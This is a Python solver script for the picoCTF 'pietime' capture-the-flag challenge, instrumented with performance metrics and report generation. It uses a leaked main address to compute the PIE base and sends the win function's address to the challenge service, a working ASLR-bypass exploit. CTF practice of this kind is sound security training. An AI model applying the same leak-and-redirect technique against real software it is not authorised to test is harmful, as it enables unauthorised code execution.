
import angr
import time
import logging
import psutil
import matplotlib.pyplot as plt
import numpy as np
import os
from datetime import datetime
from pwn import *

class PieTimeAnalyzer:
    def __init__(self, binary_path="./pietime", remote=False, host="rescued-float.picoctf.net", port=57918):
        self.binary_path = binary_path
        self.binary_name = os.path.basename(binary_path)
        self.remote = remote
        self.remote_host = host
        self.remote_port = port
        self.project = angr.Project(binary_path, auto_load_libs=False)

        self.main_offset = self.project.loader.main_object.get_symbol('main').relative_addr
        self.win_offset = self.project.loader.main_object.get_symbol('win').relative_addr

        self.metrics = {
            'execution_time': 0,
            'memory_usage': 0,
            'win_address': 0,
            'main_address': 0,
            'cfg_time': 0,
            'symbols_found': 0,
            'solution_found': False,
            'solution_value': None,
            'connection_time': 0,
            'dynamic_relocs': 0,
            'aslr_slide': 0
        }
        self.setup_logging()

    def setup_logging(self):
        os.makedirs("pietime_metrics", exist_ok=True)
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f"pietime_metrics/{self.binary_name}_analysis.log"),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger("PieTimeAnalyzer")

    def calculate_cfg_metrics(self):
        self.logger.info("Generating CFG for pietime...")
        start_time = time.time()
        cfg = self.project.analyses.CFGFast()
        cfg_time = time.time() - start_time
        self.logger.info(f"CFG generation time: {cfg_time:.2f}s")

        self.metrics['cfg_time'] = cfg_time
        return cfg

    def analyze_binary_properties(self):
        self.logger.info("Analyzing binary properties...")

        symbols = list(self.project.loader.main_object.symbols_by_name.keys())
        self.metrics['symbols_found'] = len(symbols)

        if hasattr(self.project.loader.main_object, 'relocs'):
            self.metrics['dynamic_relocs'] = len(self.project.loader.main_object.relocs)

        is_pie = self.project.loader.main_object.pic
        self.logger.info(f"PIE binary: {is_pie}")
        self.logger.info(f"Main offset: {hex(self.main_offset)}")
        self.logger.info(f"Win offset: {hex(self.win_offset)}")
        self.logger.info(f"Symbols found: {self.metrics['symbols_found']}")
        self.logger.info(f"Dynamic relocations: {self.metrics['dynamic_relocs']}")

    def run_analysis(self):
        self.logger.info(f"Starting analysis of {self.binary_name}")
        start_time = time.time()
        proc = psutil.Process()  
        start_memory = proc.memory_info().rss / 1024 / 1024

        self.analyze_binary_properties()
        cfg = self.calculate_cfg_metrics()

        self.logger.info("Connecting to process...")
        conn_start_time = time.time()

        if self.remote:
            conn = remote(self.remote_host, self.remote_port)
        else:
            conn = process(self.binary_path)  

        conn_time = time.time() - conn_start_time
        self.metrics['connection_time'] = conn_time

        try:
            received = conn.recvline_contains(b"Address of main:").decode()
            self.logger.info(f"Received: {received.strip()}")

            import re
            match = re.search(r'0x[0-9a-f]+', received)
            if not match:
                self.logger.error("Couldn't find main address!")
                raise ValueError("Main address not found in output")

            main_runtime_addr = int(match.group(0), 16)
            self.metrics['main_address'] = main_runtime_addr

            real_base = main_runtime_addr - self.main_offset
            real_win_addr = real_base + self.win_offset
            self.metrics['win_address'] = real_win_addr
            self.metrics['aslr_slide'] = real_base - self.project.loader.min_addr

            self.logger.info(f"Runtime main address: {hex(main_runtime_addr)}")
            self.logger.info(f"Calculated base address: {hex(real_base)}")
            self.logger.info(f"Real win address: {hex(real_win_addr)}")
            self.logger.info(f"ASLR slide: {hex(self.metrics['aslr_slide'])}")

            conn.recvuntil(b"Enter the address to jump to")
            conn.sendline(hex(real_win_addr).encode())

            result = conn.recvall(timeout=5)
            result_str = result.decode(errors='ignore')

            if "flag" in result_str.lower() or "success" in result_str.lower():
                self.metrics['solution_found'] = True
                self.metrics['solution_value'] = hex(real_win_addr)
                self.logger.info("Solution found!")
            else:
                self.logger.warning("No clear flag/success message found.")

            self.solution_output = result_str

        except Exception as e:
            self.logger.error(f"Error during exploitation: {str(e)}")
        finally:
            conn.close()

        end_time = time.time()
        end_memory = proc.memory_info().rss / 1024 / 1024

        self.metrics['execution_time'] = end_time - start_time
        self.metrics['memory_usage'] = end_memory - start_memory

        self.logger.info("Analysis completed")
        return self.metrics

    def generate_report(self):
        report_dir = "pietime_metrics"
        os.makedirs(report_dir, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join(report_dir, f"{self.binary_name}_report_{timestamp}.txt")

        self.generate_visualizations(report_dir, timestamp)

        with open(report_file, 'w') as f:
            f.write(f"=== PieTime Analysis Report ===\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

            f.write("=== Binary Properties ===\n")
            f.write(f"Binary Name: {self.binary_name}\n")
            f.write(f"Main Offset: {hex(self.main_offset)}\n")
            f.write(f"Win Offset: {hex(self.win_offset)}\n")
            f.write(f"Symbols Found: {self.metrics['symbols_found']}\n")
            f.write(f"Dynamic Relocations: {self.metrics['dynamic_relocs']}\n\n")

            f.write("=== Runtime Info ===\n")
            f.write(f"Main Runtime Address: {hex(self.metrics['main_address'])}\n")
            f.write(f"Win Runtime Address: {hex(self.metrics['win_address'])}\n")
            f.write(f"ASLR Slide: {hex(self.metrics['aslr_slide'])}\n\n")

            f.write("=== Performance Metrics ===\n")
            f.write(f"Execution Time: {self.metrics['execution_time']:.2f} sec\n")
            f.write(f"Connection Time: {self.metrics['connection_time']:.2f} sec\n")
            f.write(f"CFG Generation Time: {self.metrics['cfg_time']:.2f} sec\n")
            f.write(f"Memory Usage: {self.metrics['memory_usage']:.2f} MB\n\n")

            f.write("=== Solution ===\n")
            if self.metrics['solution_found']:
                f.write(f"Solution Address: {self.metrics['solution_value']}\n")
                f.write("\n=== Program Output ===\n")
                f.write("="*40 + "\n")
                f.write(self.solution_output)
                f.write("\n" + "="*40 + "\n")
            else:
                f.write("No solution found.\n")

        self.logger.info(f"Report generated: {report_file}")
        return report_file

    def generate_visualizations(self, report_dir, timestamp):
        plt.figure(figsize=(8, 6))
        labels = ['CFG Time', 'Connection Time', 'Execution Time', 'Memory Usage (MB)']
        values = [
            self.metrics['cfg_time'],
            self.metrics['connection_time'],
            self.metrics['execution_time'],
            self.metrics['memory_usage']
        ]
        bars = plt.bar(labels, values, color=['#5bc0de', '#f0ad4e', '#d9534f', '#5cb85c'])
        for bar in bars:
            height = bar.get_height()
            plt.text(bar.get_x() + bar.get_width()/2., height + 0.1, f'{height:.2f}', ha='center', va='bottom')
        plt.title('PieTime Performance Metrics')
        plt.tight_layout()
        plt.savefig(f"{report_dir}/performance_{timestamp}.png")
        plt.close()

if __name__ == "__main__":
    analyzer = PieTimeAnalyzer(remote=False)
    analyzer.run_analysis()
    report_file = analyzer.generate_report()

    print(f"\nAnalysis completed! Report saved to: {report_file}")
    print("\nKey Findings:")
    print(f"- Solution Found: {'Yes' if analyzer.metrics['solution_found'] else 'No'}")
    if analyzer.metrics['solution_found']:
        print(f"- Win Address: {analyzer.metrics['solution_value']}")
    print(f"- ASLR Slide: {hex(analyzer.metrics['aslr_slide'])}")
    print(f"- Execution Time: {analyzer.metrics['execution_time']:.2f} seconds")
    print(f"- Memory Usage: {analyzer.metrics['memory_usage']:.2f} MB")